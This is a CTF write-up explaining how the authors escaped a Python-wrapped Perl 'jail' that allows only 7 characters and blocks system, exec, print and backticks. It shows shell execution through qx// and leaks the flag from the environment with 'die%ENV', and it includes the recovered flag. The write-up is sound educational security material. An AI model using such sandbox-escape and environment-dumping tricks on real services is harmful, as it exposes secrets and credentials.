# Jail 1 & 2

In these challenges we can execute Perl in a restricted environment created using a Python script called `wrapper.py`. From the Jail 2 challenge:

```python
#!/usr/bin/python3

import os
import sys
import subprocess
from functools import partial

flag = 'REDACTED'
max_length = 7

user_input = ''
while True:
    chunk = sys.stdin.read(256)
    if not chunk:
        break
    user_input += chunk

    if len(user_input) > max_length:
        print("Length: {}".format(len(user_input)))
        print("Too long!")
        sys.exit(3)

prohibited_funcs = ['system', 'exec', 'fork', 'print']

for prohibited_func in prohibited_funcs:
    if prohibited_func in user_input:
        print("No {}!".format(prohibited_func))
        sys.exit(1)

if '`' in user_input:
    print("No backticks!")
    sys.exit(2)

print("Length: {}".format(len(user_input)))

env = os.environ
env['flag'] = flag

p = subprocess.run(['perl', '-Mstrict', '-e', user_input], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
sys.stdout.buffer.write(p.stdout)
#if p.returncode:
#    sys.stdout.write('Process exited: {}\n'.format(p.returncode))
sys.stdout.flush()
```

Jail 2 is a hardened version of the Jail 1 challenge, with the only differences being:

```python
$ diff -u jail1-wrapper.py jail2-wrapper.py
--- jail1-wrapper.py	2019-08-23 21:24:18.000000000 +0200
+++ jail2-wrapper.py	2019-08-23 21:33:25.000000000 +0200
@@ -6,7 +6,7 @@
 from functools import partial

 flag = 'REDACTED'
-max_length = 35
+max_length = 7

 user_input = ''
 while True:
@@ -36,8 +36,8 @@
 env = os.environ
 env['flag'] = flag

-p = subprocess.run(['perl', '-e', user_input], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
+p = subprocess.run(['perl', '-Mstrict', '-e', user_input], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
 sys.stdout.buffer.write(p.stdout)
-if p.returncode:
-    sys.stdout.write('Process exited: {}\n'.format(p.returncode))
+#if p.returncode:
+#    sys.stdout.write('Process exited: {}\n'.format(p.returncode))
 sys.stdout.flush()
```

From the Jail 2 `wrapper.py` script we see that we can give a maximum of 7 characters of Perl code to be executed. We get both standard output and standard error from Perl. A few Perl functions are banned and we have to leak the flag stored in the environment variable `flag`:

```bash
$ echo -n 'AAAAAAAA' | python3 wrapper.py
Length: 8
Too long!
$ echo -n 'print 4' | python3 wrapper.py
No print!
$ echo -n 'warn 42' | python3 wrapper.py
Length: 7
42 at -e line 1.
```

We then started reading the Perl docs and found [the qx/STRING/ operator](https://perldoc.perl.org/perlop.html#Quote-Like-Operators):

```bash
$ echo -n 'qx/>a/' | nc -v -N challenges.openctf.cat 9026
Connection to challenges.openctf.cat 9026 port [tcp/*] succeeded!
sh: can't create a: Read-only file system
Length: 6
$ echo -n 'qx/*/' | nc -v -N challenges.openctf.cat 9026
Connection to challenges.openctf.cat 9026 port [tcp/*] succeeded!
sh: bin: not found
Length: 5
```

With only 7 characters, our options are limited though. We started thinking about whether we could abuse the fact that Python 3 strings are unicode by default:

```python
$ echo -ne '\xaa' | python3 ./wrapper.py 
Traceback (most recent call last):
  File "./wrapper.py", line 13, in <module>
    chunk = sys.stdin.read(256)
  File "/usr/lib/python3.7/codecs.py", line 322, in decode
    (result, consumed) = self._buffer_decode(data, self.errors, final)
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xaa in position 0: invalid start byte
```

But this only allows us to leak a strack trace which obviously contained no flag.

We went back to the Perl docs and played a bit around. After a while we noticed that we can output the Perl environment array using `%ENV` and that we don't always necessarily need to use a space after a Perl function:

```bash
$ perl -Mstrict -e 'warn%ENV'
SHLVL1SSH_CONNECTION192.168.2.165 53779 192.168.2.140 22PATH/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamesTERMxterm-256colorHOME/rootPWD/rootSSH_CLIENT192.168.2.165 53779 22LS_COLORSrs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:SHELL/bin/bashMAIL/var/mail/rootXDG_RUNTIME_DIR/run/user/0LESSOPEN| /usr/bin/lesspipe %sS_COLORSautoLESSCLOSE/usr/bin/lesspipe %s %sLANGCSSH_TTY/dev/pts/2XDG_SESSION_ID31762USERrootLOGNAMEroot_/usr/bin/perl at -e line 1.
```

At 8 characters, we were almost there with the payload `warn%ENV` - how to trim it further?

Looking for [other Perl functions](https://perldoc.perl.org/index-functions.html) we noticed the [die](https://perldoc.perl.org/functions/die.html) function. If we use `die` with a string argument, this will be printed to standard error. We can use the same trick regarding omitting the space and our final payload will look like this: `die%ENV`:

```bash
$ echo -n 'die%ENV' | nc -v -N challenges.openctf.cat 9026
Connection to challenges.openctf.cat 9026 port [tcp/*] succeeded!
SOCAT_SOCKADDR10.255.4.27SOCAT_PPID1SOCAT_SOCKPORT5000flagflag{join_me_4_the_triumphant_return_of_perl}HOME/rootSOCAT_PEERADDR10.255.0.2SOCAT_VERSION1.7.3.3SOCAT_PEERPORT65254HOSTNAME144d045c1d1fSOCAT_PID1008PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin at -e line 1.
Length: 7
```

From the output we can extract the flag:

```
flag{join_me_4_the_triumphant_return_of_perl}
```
